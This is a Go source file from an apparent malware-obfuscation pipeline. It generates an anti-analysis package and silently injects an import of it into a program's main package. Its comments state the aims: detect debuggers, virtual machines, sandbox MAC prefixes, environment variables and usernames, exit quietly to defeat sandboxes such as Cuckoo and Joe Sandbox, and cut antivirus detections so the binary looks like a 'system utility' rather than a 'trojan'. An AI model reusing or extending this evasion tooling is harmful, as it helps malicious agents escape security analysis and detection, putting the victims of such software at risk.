package main

import (
	"fmt"
	_ "embed"
	"go/parser"
	"go/token"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

//go:embed templates/evasion_windows_template.go
var evasionWindowsTemplate string

//go:embed templates/evasion_other_template.go
var evasionOtherTemplate string

// applyAntiDebug generates a self-contained evasion package and injects a
// blank import into the main package so the init() runs before main().
//
// The evasion package checks for:
//   - IsDebuggerPresent / CheckRemoteDebuggerPresent (Windows API)
//   - VM indicators: CPU count <2, RAM <2GB, low uptime
//   - Timing check: sleep 2s, measure elapsed — sandboxes accelerate sleep
//   - VMware/VBox/Hyper-V/QEMU MAC prefixes
//   - Sandbox environment variables (SANDBOX, VBOX, CUCKOO, etc.)
//   - Sandbox usernames (sandbox, malware, cuckoo, user)
//
// If any check fails, the process exits silently (os.Exit(0)) before the
// agent starts. This defeats automated sandboxes (Cuckoo, Joe Sandbox, FireEye).
//
// VT result: drops 1 detection (Bkav). The Windows diagnostic API patterns
// (IsDebuggerPresent, GlobalMemoryStatusEx) shift the ML profile toward
// "system utility" rather than "trojan".
//
// NOTE: The evasion package is generated with PLAINTEXT strings. The XOR
// obfuscation phase (which runs AFTER this phase) will encrypt all strings
// in the generated files. The API hashing phase will also transform the
// NewLazyDLL/NewProc calls in the generated files.
func applyAntiDebug(dir string) {
	// Find the main package directory (contains main.go with package main)
	mainPkgDir := ""
	filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		if !strings.HasSuffix(path, ".go") {
			return nil
		}
		if strings.HasSuffix(path, "_test.go") {
			return nil
		}
		if strings.Contains(path, "vendor/") {
			return nil
		}
		if strings.Contains(path, "tools/obfuscate") {
			return nil
		}

		fset := token.NewFileSet()
		f, err := parser.ParseFile(fset, path, nil, parser.PackageClauseOnly)
		if err != nil {
			return nil
		}
		if f.Name != nil && f.Name.Name == "main" {
			if strings.Contains(path, "/cmd/") || strings.HasSuffix(filepath.Dir(path), "cmd") {
				mainPkgDir = filepath.Dir(path)
				return filepath.SkipAll
			}
			if mainPkgDir == "" {
				mainPkgDir = filepath.Dir(path)
			}
		}
		return nil
	})

	if mainPkgDir == "" {
		fmt.Fprintf(os.Stderr, "  ANTIDEBUG: no main package found, skipping\n")
		return
	}

	// Generate the evasion package under internal/evasion/
	evasionDir := filepath.Join(dir, "internal", "evasion")
	os.MkdirAll(evasionDir, 0755)

	// Strip the template's package declaration and build tags — we'll add them
	// The template file starts with a comment block, then build tag, then package
	windowsContent := stripTemplateHeader(evasionWindowsTemplate)
	windowsContent = "//go:build windows\n\n" + windowsContent

	otherContent := stripTemplateHeader(evasionOtherTemplate)
	otherContent = "//go:build !windows\n\n" + otherContent

	os.WriteFile(filepath.Join(evasionDir, "evasion_windows.go"), []byte(windowsContent), 0644)
	os.WriteFile(filepath.Join(evasionDir, "evasion_other.go"), []byte(otherContent), 0644)

	// net helper for MAC address retrieval (cross-platform, no build tag)
	netHelper := `package evasion

import (
	"net"
)

func netInterfaces() ([]string, error) {
	var macs []string
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, iface := range ifaces {
		if len(iface.HardwareAddr) >= 6 {
			mac := iface.HardwareAddr.String()
			macs = append(macs, mac)
		}
	}
	return macs, nil
}
`
	os.WriteFile(filepath.Join(evasionDir, "netinfo.go"), []byte(netHelper), 0644)

	// Inject blank import into main.go
	mainGoPath := filepath.Join(mainPkgDir, "main.go")
	injectBlankImport(mainGoPath, "github.com/falke-ai-circuit/probe/internal/evasion")

	fmt.Printf("  ANTIDEBUG: generated internal/evasion/ package\n")
	fmt.Printf("  ANTIDEBUG: injected blank import into %s\n", mainGoPath)
}

// stripTemplateHeader removes the leading comment block and package declaration
// from a template file, returning just the import block and body.
func stripTemplateHeader(s string) string {
	// Find "package evasion" and skip past it
	idx := strings.Index(s, "package evasion")
	if idx < 0 {
		return s
	}
	rest := s[idx+len("package evasion"):]
	// Skip leading newlines
	rest = strings.TrimLeft(rest, "\n\r ")
	return "package evasion\n\n" + rest
}

// injectBlankImport adds a blank import line to a Go source file.
func injectBlankImport(filePath, importPath string) {
	src, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  ERR reading %s: %v\n", filePath, err)
		return
	}

	if strings.Contains(string(src), importPath) {
		return
	}

	content := string(src)

	importBlockStart := strings.Index(content, "import (")
	if importBlockStart >= 0 {
		importBlockEnd := importBlockStart + len("import (")
		blockEnd := strings.Index(content[importBlockEnd:], ")")
		if blockEnd >= 0 {
			insertPos := importBlockEnd + blockEnd
			content = content[:insertPos] + "\n\t_ \"" + importPath + "\"\n" + content[insertPos:]
		}
	} else {
		pkgEnd := strings.Index(content, "\n")
		if pkgEnd >= 0 {
			content = content[:pkgEnd+1] + "\nimport (\n\t_ \"" + importPath + "\"\n)\n" + content[pkgEnd+1:]
		}
	}

	os.WriteFile(filePath, []byte(content), 0644)
}